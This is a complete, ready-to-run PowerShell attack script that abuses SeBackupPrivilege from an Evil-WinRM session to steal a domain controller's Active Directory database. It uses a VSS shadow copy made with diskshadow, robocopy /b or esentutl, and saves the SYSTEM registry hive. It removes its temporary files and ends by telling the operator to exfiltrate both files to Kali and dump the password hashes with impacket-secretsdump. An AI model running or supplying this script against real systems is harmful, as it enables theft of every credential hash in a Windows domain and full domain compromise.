<#
.SYNOPSIS
    One-shot ntds.dit + SYSTEM hive extraction via SeBackupPrivilege (VSS).
    No manual .dsh file needed. Output goes to C:\Windows\Temp.
.USAGE
    .\Invoke-NTDSExtract.ps1
    (Run from an Evil-WinRM session as a Backup Operators member.)
#>

$ErrorActionPreference = "Stop"

# --- Config ---
$WorkDir     = "C:\Windows\Temp"
$ShadowDrive = "Z:"
$DshFile     = Join-Path $WorkDir "vss_extract.dsh"
$OutNtds     = Join-Path $WorkDir "ntds.dit"
$OutSystem   = Join-Path $WorkDir "SYSTEM"

Write-Host "[*] Starting SeBackupPrivilege ntds.dit extraction" -ForegroundColor Cyan
Write-Host "[*] Work dir: $WorkDir" -ForegroundColor Gray

# --- Step 1: Write the diskshadow script (ASCII, CRLF, no BOM) ---
# Use a here-string written via [IO.File]::WriteAllText to guarantee exact content.
$dshContent = @"
set context persistent nowriters
set metadata $WorkDir\meta.cab
set verbose on
add volume C: alias cdrive
create
expose %cdrive% $ShadowDrive
"@

# Ensure CRLF line endings and ASCII encoding, no BOM
$dshContent = $dshContent -replace "`r?`n", "`r`n"
[System.IO.File]::WriteAllText($DshFile, $dshContent, [System.Text.Encoding]::ASCII)
Write-Host "[+] diskshadow script written: $DshFile" -ForegroundColor Green

# --- Step 2: Run diskshadow and capture output ---
Write-Host "[*] Running diskshadow (creating VSS snapshot)..." -ForegroundColor Cyan
$dshOut = & diskshadow.exe /s $DshFile 2>&1
$dshOut | ForEach-Object { Write-Host "    $_" -ForegroundColor DarkGray }

# --- Step 3: Verify the shadow drive exists ---
if (-not (Test-Path "$ShadowDrive\")) {
    Write-Host "[-] Shadow drive $ShadowDrive not found. diskshadow may have failed." -ForegroundColor Red
    Write-Host "[*] Falling back to esentutl /vss..." -ForegroundColor Yellow

    # Fallback: esentutl can copy locked files using VSS directly
    & esentutl.exe /y /vss "C:\Windows\NTDS\ntds.dit" /d $OutNtds 2>&1 | ForEach-Object {
        Write-Host "    $_" -ForegroundColor DarkGray
    }

    if (-not (Test-Path $OutNtds)) {
        Write-Error "esentutl fallback also failed. Aborting."
        exit 1
    }
    Write-Host "[+] ntds.dit copied via esentutl fallback." -ForegroundColor Green
} else {
    Write-Host "[+] Shadow copy mounted at $ShadowDrive" -ForegroundColor Green

    # --- Step 4: Copy ntds.dit with robocopy /b (backup semantics) ---
    Write-Host "[*] Copying ntds.dit with robocopy /b..." -ForegroundColor Cyan
    $rc = & robocopy.exe "$ShadowDrive\Windows\NTDS" $WorkDir ntds.dit /b /njh /njs /ndl /nc /ns 2>&1
    $rc | ForEach-Object { Write-Host "    $_" -ForegroundColor DarkGray }

    if (-not (Test-Path $OutNtds)) {
        Write-Error "robocopy failed to copy ntds.dit."
        exit 1
    }
    Write-Host "[+] ntds.dit copied: $OutNtds" -ForegroundColor Green
}

# --- Step 5: Save SYSTEM hive ---
Write-Host "[*] Saving SYSTEM registry hive..." -ForegroundColor Cyan
& reg.exe save HKLM\SYSTEM $OutSystem /y 2>&1 | ForEach-Object {
    Write-Host "    $_" -ForegroundColor DarkGray
}
if (-not (Test-Path $OutSystem)) {
    Write-Error "Failed to save SYSTEM hive."
    exit 1
}
Write-Host "[+] SYSTEM hive saved: $OutSystem" -ForegroundColor Green

# --- Step 6: Cleanup temp script and metadata ---
Remove-Item $DshFile -Force -ErrorAction SilentlyContinue
Remove-Item (Join-Path $WorkDir "meta.cab") -Force -ErrorAction SilentlyContinue

# --- Step 7: Report ---
Write-Host ""
Write-Host "=============================================" -ForegroundColor Yellow
Write-Host " EXTRACTION COMPLETE" -ForegroundColor Yellow
Write-Host "=============================================" -ForegroundColor Yellow
Get-Item $OutNtds, $OutSystem | Select-Object FullName, Length | Format-Table -AutoSize
Write-Host "Next: exfiltrate both files to Kali, then run:" -ForegroundColor Cyan
Write-Host "  impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL" -ForegroundColor Gray
Write-Host "=============================================" -ForegroundColor Yellow
